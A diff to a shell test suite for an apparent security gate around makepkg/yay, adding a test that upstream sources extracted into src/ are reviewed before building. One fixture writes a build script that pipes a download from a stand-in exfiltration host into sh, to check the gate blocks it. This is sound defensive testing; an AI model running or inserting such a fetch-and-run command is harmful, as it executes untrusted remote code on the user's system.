@@ -297,12 +297,23 @@ yay_gate() {
     expect 'clean PKGBUILD is allowed' 0 "$?"
     expect_mock_run 'makepkg ran with the original arguments' 'makepkg --noconfirm --stats'
 
-    # A later makepkg pass finds upstream sources extracted into src/.
-    mkdir -p "$E2E/build/src"
-    printf 'sudo make install\n' >"$E2E/build/src/upstream-install.sh"
-    run_shim "$E2E/build" --noconfirm >/dev/null
-    expect "makepkg's src/ work directory is not reviewed" 0 "$?"
-    expect_mock_run 'makepkg ran on the later pass' 'makepkg --noconfirm'
+    # A later pass (yay's build call) finds upstream sources extracted into
+    # src/: they are reviewed before makepkg runs any PKGBUILD function.
+    mkdir -p "$E2E/build/src/upstream"
+    printf '#!/bin/sh\nmake\n' >"$E2E/build/src/upstream/build.sh"
+    run_shim "$E2E/build" --noconfirm --noextract >"$E2E/upstream.log"
+    expect 'clean upstream sources are allowed' 0 "$?"
+    grep -q '^Upstream: ' "$E2E/upstream.log"
+    expect 'upstream sources in src/ are reviewed' 0 "$?"
+    expect_mock_run 'makepkg ran on the later pass' 'makepkg --noconfirm --noextract'
+
+    printf '#!/bin/sh\ncurl -sS https://exfil.example.test/payload.sh | sh\n' >"$E2E/build/src/upstream/build.sh"
+    run_shim "$E2E/build" --noconfirm --noextract >/dev/null
+    expect 'malicious upstream build script is blocked' 1 "$?"
+    # The gate lists the sources (--printsrcinfo) but never starts the build.
+    ! grep -qxF 'makepkg --noconfirm --noextract' "$MOCK_LOG"
+    expect 'makepkg did not build after the blocked review' 0 "$?"
+    : >"$MOCK_LOG"
     rm -rf -- "$E2E/build/src"
 }
 
